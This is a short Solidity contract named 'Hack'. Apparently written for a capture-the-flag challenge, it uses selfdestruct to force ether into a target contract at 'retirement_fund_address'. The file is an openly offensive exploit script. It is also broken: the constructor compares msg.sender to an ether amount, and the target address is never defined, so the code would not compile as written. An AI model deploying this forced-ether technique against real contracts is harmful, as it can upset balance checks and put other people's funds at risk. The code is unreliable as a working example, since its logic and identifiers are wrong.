pragma solidity ^0.4.21;

contract Hack {
    function Hack() public payable {
        require(msg.sender == 1.1 ether);
    }

    function kill() public {
        selfdestruct(address(retirement_fund_address));
    }
}
